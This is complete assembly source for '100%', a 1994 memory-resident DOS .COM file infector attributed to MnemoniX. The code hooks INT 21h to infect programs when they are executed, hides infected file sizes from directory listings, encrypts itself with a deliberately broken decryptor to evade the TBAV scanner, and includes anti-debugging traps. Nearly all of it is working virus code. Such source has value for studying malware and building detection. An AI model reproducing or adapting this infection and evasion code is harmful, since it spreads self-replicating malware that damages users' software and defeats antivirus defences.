; =======================================================================>
;  100% By MnemoniX - 1994
;
;  This is a memory resident .COM infector which hides itself using
;  directory stealth (11/12 and 4E/4F). To avoid setting heuristic
;  flags in TBAV, it overwrites part of the decryption routine with
;  garbage and adds instructions to repair it on the header of the
;  program. Runs through TBAV flawlessly. Examine it in action and
;  observe for yourself.
;
;  This virus also includes debugger traps to thwart tracing.
; =======================================================================>

PING            equ     30F4h                   ; give INT 21 this value ...
PONG            equ     0DEADh                  ; if this returns we're res.
ID              equ     '%0'                    ; ID marker
HEADER_SIZE     equ     22                      ; 22 - byte .COM header
MARKER          equ     20                      ; marker at offset 20

code            segment byte    public  'code'
                org     100h
                assume  cs:code

start:
                db      17 dup (90h)            ; simulate infected program
                jmp     virus_begin             ; a real host program will
                dw      ID                      ; have some MOVs at the
host:
                db      0CDh,20h                ; beginning
                db      20 dup(90h)

virus_begin:
                db      0BBh                    ; mov bx,offset viral_code
code_offset     dw      offset virus_code
                db      0B8h                    ; mov ax,cipher
cipher          dw      0
                mov     cx,VIRUS_SIZE / 2 + 1   ; mov cx,length of code
decrypt:
                xor     [bx],ax                 ; in real infections,
                ror     ax,1                    ; portions of this code
                inc     bx                      ; will be replaced with
                inc     bx                      ; dummy bytes, which will be
                loop    decrypt                 ; fixed up by the header.
                                                ; this complicates scanning
virus_code:
                call    $+3                     ; BP is instruction pointer
                pop     bp
                sub     bp,offset $-1
                
                xor     ax,ax                   ; anti-trace ...
                mov     es,ax                   ; set interrupts 0-3 to point
                mov     di,ax                   ; to The Great Void in high
                dec     ax                      ; memory ...
                mov     cl,8
                rep     movsw
                
                mov     ax,PING                 ; test for residency
                int     21h
                cmp     bx,PONG
                je      installed

                in      al,21h                  ; another anti-debugger
                xor     al,2                    ; routine ... lock out
                out     21h,al                  ; keyboard
                xor     al,2
                out     21h,al

                mov     ax,ds                   ; not resident - install
                dec     ax                      ; ourselves in memory
                mov     ds,ax

                sub     word ptr ds:[3],(MEM_SIZE + 15) / 16 + 1
                sub     word ptr ds:[12h],(MEM_SIZE + 15) / 16 + 1
                mov     ax,ds:[12h]
                mov     ds,ax

                sub     ax,15
                mov     es,ax
                mov     byte ptr ds:[0],'Z'
                mov     word ptr ds:[1],8
                mov     word ptr ds:[3],(MEM_SIZE + 15) / 16

                push    cs                      ; now move virus into memory
                pop     ds
                mov     di,100h
                mov     cx,(offset virus_end - offset start) / 2
                lea     si,[bp + offset start]
                rep     movsw

                xor     ax,ax                   ; change interrupt 21 to point
                mov     ds,ax                   ; to ourselves

                mov     si,21h * 4
                mov     di,offset old_int_21    ; (saving original int 21)
                movsw
                movsw

                mov     word ptr ds:[si - 2],0  ; anti-trace - temporarily
                                                ; kill int 21
                mov     ds:[si - 4],offset new_int_21
                mov     ds:[si - 2],es

installed:
                push    cs                      ; restore segregs
                push    cs
                pop     ds
                pop     es
                lea     si,[bp + offset host]   ; and restore original
                mov     di,100h                 ; bytes of program
                push    di
                mov     cx,HEADER_SIZE
                rep     movsb

                ret                             ; and we're done

; Interrupt 21 handler - trap file execute, search, open, read, and
; moves to the end of the file.

int_21:
                pushf
                call    dword ptr cs:[old_int_21]
                ret

new_int_21:
                cmp     ax,30F4h                ; residency test?
                je      test_pass               ; yes ....

                cmp     ax,4B00h                ; file execute?
                jne     stealth
                jmp     execute                 ; yes, infect ...

stealth:
                cmp     ah,11h                  ; directory stealth
                je      dir_stealth_1
                cmp     ah,12h
                je      dir_stealth_1

                cmp     ah,4Eh                  ; more directory stealth
                je      dir_stealth_2
                cmp     ah,4Fh
                je      dir_stealth_2

int_21_exit:
                db      0EAh                    ; never mind ...
old_int_21      dd      0

test_pass:
                call    int_21                  ; get real DOS version
                mov     bx,PONG                 ; and give pass signal
                iret

dir_stealth_1:
                call    int_21                  ; perform directory search
                cmp     al,-1                   ; no more files?
                jne     check_file
                iret                            ; no, skip it
check_file:
                push    ax bx es                ; check file for infection

                mov     ah,2Fh
                int     21h

                cmp     byte ptr es:[bx],-1     ; check for extended FCB
                jne     no_ext_FCB
                add     bx,7

no_ext_FCB:
                cmp     word ptr es:[bx + 9],'OC'
                jne     fixed                   ; not .COM file, ignore

                mov     ax,word ptr es:[bx + 17h]
                and     al,31                   ; check seconds -
                cmp     al,26                   ; if 52, infected
                jne     fixed

                sub     word ptr es:[bx + 1Dh],VIRUS_SIZE + HEADER_SIZE
                sbb     word ptr es:[bx + 1Fh],0
fixed:
                pop     es bx ax
                iret

dir_stealth_2:
                call    int_21                  ; perform file search
                jnc     check_file_2            ; if found, proceed
                retf    2                       ; nope, leave
check_file_2:
                push    ax bx si es

                mov     ah,2Fh                  ; find DTA
                int     21h

                xor     si,si                   ; verify that this is a .COM
find_ext:
                cmp     byte ptr es:[bx + si],'.'
                je      found_ext
                inc     si
                jmp     find_ext
found_ext:
                cmp     word ptr es:[bx + si + 1],'OC'
                jne     fixed_2                 ; if not .COM, skip

                mov     ax,word ptr es:[bx + 16h]
                and     al,31                   ; check for infection marker
                cmp     al,26
                jne     fixed_2                 ; not found, skip

                sub     word ptr es:[bx + 1Ah],VIRUS_SIZE + HEADER_SIZE
                sbb     word ptr es:[bx + 1Ch],0
fixed_2:
                pop     es si bx ax             ; done
                clc
                retf    2

execute:
                push    ax bx cx dx di ds es    ; file execute ... check
                                                ; if uninfected .COM file,
                mov     ax,3D00h                ; and if so, infect
                call    int_21
                jnc     read_header
                jmp     exec_exit               ; can't open, leave

read_header:
                xchg    ax,bx

                push    bx                      ; save file handle
                mov     ax,1220h                ; get system file table
                int     2Fh                     ; entry

                nop                             ; remove this if you don't
                                                ; mind scanning as [512] under
                                                ; SCAN ...

                mov     bl,es:[di]              ; get number of the SFT
                mov     ax,1216h                ; for this handle
                int     2Fh                     ; ES:DI now points to SFT
                pop     bx

                mov     word ptr es:[di + 2],2  ; change open mode to R/W

                push    word ptr es:[di + 13]   ; save file date
                push    word ptr es:[di + 15]   ; and file time

                mov     ax,word ptr es:[di + 11h]
                cmp     ax,62579 - VIRUS_SIZE   ; too big?
                je      exec_close

                cmp     ax,22                   ; too small?
                jb      exec_close

                add     ax,HEADER_SIZE - 3      ; calculate virus offset


                push    cs
                pop     ds

                mov     ds:virus_offset,ax

                mov     ah,3Fh                  ; read header of file
                mov     cx,HEADER_SIZE          ; to check for infection
                mov     dx,offset read_buffer
                call    int_21

                cmp     word ptr ds:read_buffer,'ZM'
                je      exec_close              ; don't infect .EXE

                cmp     word ptr ds:read_buffer[MARKER],ID  ; if infected
                je      exec_close              ; already, skip it

                mov     ax,4202h                ; move to end of file
                call    move_ptr_write

                mov     dx,offset read_buffer   ; and save header
                call    int_21

                call    encrypt_code            ; encrypt the virus code
                call    create_header           ; and create unique header

                mov     ah,40h
                mov     cx,VIRUS_SIZE           ; write virus code to file
                mov     dx,offset encrypt_buffer
                int     21h

                mov     ax,4200h                ; back to beginning of file
                call    move_ptr_write

                mov     dx,offset new_header    ; write new header
                call    int_21

                pop     dx                      ; restore file date & time
                pop     cx
                and     cl,0E0h                 ; but with timestamp
                or      cl,26
                mov     ax,5701h
                int     21h

                mov     ah,3Eh                  ; close file
                int     21h

exec_exit:
                pop     es ds di dx cx bx ax
                jmp     int_21_exit
                
move_ptr_write:
                cwd                             ; move file pointer
                xor     cx,cx
                int     21h
                mov     cx,HEADER_SIZE          ; and prepare for write 
                mov     ah,40h                  ; to file
                ret

exec_close:
                pop     ax ax                   ; clean off stack
                mov     ah,3Eh                  ; and close
                int     21h
                jmp     exec_exit

encrypt_code    proc    near

                push    si es

                push    cs
                pop     es

                xor     ah,ah                   ; get random no.
                int     1Ah                     ; and store in decryption
                mov     cipher,dx               ; module

                mov     ax,ds:virus_offset
                add     ax,DECRYPTOR_SIZE + 103h
                mov     code_offset,ax
                
                mov     si,offset virus_begin   ; first store header
                mov     di,offset encrypt_buffer
                mov     cx,DECRYPTOR_SIZE
                rep     movsb                   ; (unencryted)

                mov     cx,ENCRYPTED_SIZE / 2 + 1 ; now encrypt & store code

encrypt:
                lodsw                           ; simple encryption routine
                xor     ax,dx
                ror     dx,1
                stosw
                loop    encrypt

                pop     es si
                ret

encrypt_code    endp

create_header   proc    near

                mov     ax,ds:virus_offset      ; fix up addresses in new
                add     ax,103h + (offset decrypt - offset virus_begin)
                mov     ds:mov_1,ax             ; header
                inc     ax
                inc     ax
                mov     ds:mov_2,ax

                xor     ah,ah                   ; fill in useless MOVs
                int     1Ah                     ; with random bytes
                mov     ds:mov_al,cl
                mov     ds:mov_ax,dx

                push    es cs
                pop     es
                mov     di,offset encrypt_buffer
                add     di,offset decrypt - offset virus_begin
                mov     ax,dx                   ; now fill decryption module
                neg     ax                      ; with some garbage
                stosw
                rol     ax,1
                stosw
                pop     es

                sub     word ptr ds:virus_offset,17 ; fix up JMP instruction

                ret                             ; done
create_header   endp

new_header      db      0C7h,06
mov_1           dw      00
                db      31h,07                  ; first MOV            6
                db      0B0h
mov_al          db      00                      ; a nothing MOV AL,    2
                db      0C7h,06
mov_2           dw      00
                db      0D1h,0C8h               ; second MOV           6
                db      0B8h
mov_ax          dw      00                      ; a nothing MOV AX,    3
                db      0E9h                    ; jump instruction     1
virus_offset    dw      0                       ; virus offset         2
                dw      ID                      ; ID marker            2
                                                ; total bytes =       22

sig             db      '[100%] By MnemoniX 1994',0

virus_end:

VIRUS_SIZE      equ     offset virus_end - offset virus_begin

read_buffer     dw      HEADER_SIZE dup (?)     ; storage for orig header
encrypt_buffer  dw      VIRUS_SIZE dup (?)      ; storage for encrypted virus

heap_end:

MEM_SIZE        equ     offset heap_end - offset start
DECRYPTOR_SIZE  equ     offset virus_code - offset virus_begin
ENCRYPTED_SIZE  equ     offset virus_end - offset virus_code

code            ends
                end     start
